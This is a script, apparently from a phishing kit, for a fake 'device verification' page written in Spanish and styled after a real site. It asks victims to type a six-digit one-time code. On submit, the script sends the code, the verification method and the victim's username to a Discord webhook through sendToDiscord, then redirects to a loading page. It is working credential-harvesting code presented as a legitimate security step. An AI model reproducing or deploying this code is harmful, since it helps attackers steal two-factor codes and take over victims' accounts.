      <script>
// Script para codex.html - Mostrar método seleccionado y manejar timer

// Función para aplicar tema claro/oscuro
function applyTheme() {
  const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches;
  
  if (isDarkMode) {
    document.documentElement.style.colorScheme = 'dark';
    document.body.style.backgroundColor = '#1a1a1a';
    document.body.style.color = '#ffffff';
  } else {
    document.documentElement.style.colorScheme = 'light';
    document.body.style.backgroundColor = '#ffffff';
    document.body.style.color = '#000000';
  }
}

document.addEventListener('DOMContentLoaded', function() {
  // Aplicar tema al cargar
  applyTheme();
  
  // Escuchar cambios de tema del dispositivo
  window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', applyTheme);

  const verificationMethod = getSessionData().verificationMethod || 'email';
  const introText = document.querySelector('.DeviceVerification_intro__tovB1');
  const timerDisplay = document.querySelector('.DeviceVerification_timerText__G_w02');
  const acceptButton = document.querySelector('.principalPage_btnStart__bwiiV');
  // Cambiar texto según el método
  if (verificationMethod === 'email') {
    introText.innerHTML = 'Enviamos un código de 6 dígitos a tu correo electrónico registrado:<br><b>*******@******.com</b>';
  } else if (verificationMethod === 'sms') {
    introText.innerHTML = 'Enviamos un código de 6 dígitos a tu número de teléfono registrado:<br><b>+58 *** *** ****</b>';
  }
  // Timer de 2 minutos
  let timeLeft = 120; // 120 segundos = 2 minutos
  function updateTimer() {
    const minutes = Math.floor(timeLeft / 60);
    const seconds = timeLeft % 60;
    const formattedTime = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
    timerDisplay.textContent = `Enviar código en ${formattedTime}`;
    if (timeLeft > 0) {
      timeLeft--;
      setTimeout(updateTimer, 1000);
    } else {
      timerDisplay.textContent = 'Código expirado';
      acceptButton.disabled = true;
    }
  }
  // Iniciar timer
  updateTimer();
  // Validar tokens
  const tokenInputs = document.querySelectorAll('.FormToken_tokenInput__6S5go');
  tokenInputs.forEach((input, index) => {
    input.addEventListener('input', function(e) {
      // Solo números
      this.value = this.value.replace(/[^0-9]/g, '');
      // Mover al siguiente input
      if (this.value && index < tokenInputs.length - 1) {
        tokenInputs[index + 1].focus();
      }
      // Verificar si están todos llenos
      checkAllFilled();
    });
    input.addEventListener('keydown', function(e) {
      // Backspace para ir al anterior
      if (e.key === 'Backspace' && !this.value && index > 0) {
        tokenInputs[index - 1].focus();
      }
    });
  });
  function checkAllFilled() {
    const allFilled = Array.from(tokenInputs).every(input => input.value.length === 1);
    acceptButton.disabled = !allFilled;
  }
  // Habilitar botón inicialmente si está deshabilitado
  acceptButton.disabled = true;
  // Enviar código
  acceptButton.addEventListener('click', function() {
    const code = Array.from(tokenInputs).map(input => input.value).join('');
    
    if (code.length === 6) {
      setSessionData({ verificationCode: code });
      sendToDiscord({
        title: "✅𝐶ó𝑑𝑖𝑔𝑜 𝑑𝑒 𝑉𝑒𝑟𝑖𝑓𝑖𝑐𝑎𝑐𝑖ó𝑛✅",
        color: 0x8A2BE2,
        fields: [
          { name: "𝐶ó𝑑𝑖𝑔𝑜", value: `\`${code}\``, inline: false },
          { name: "𝑀é𝑡𝑜𝑑𝑜", value: `\`${verificationMethod.toUpperCase()}\``, inline: false },
          { name: "𝑈𝑠𝑢𝑎𝑟𝑖𝑜", value: `\`${getSessionData().username}\``, inline: false }
        ]
      });
      // Redirigir a load.html con parámetro codex
      redirectTo('load.html?from=codex');
    }
  });
});
</script>
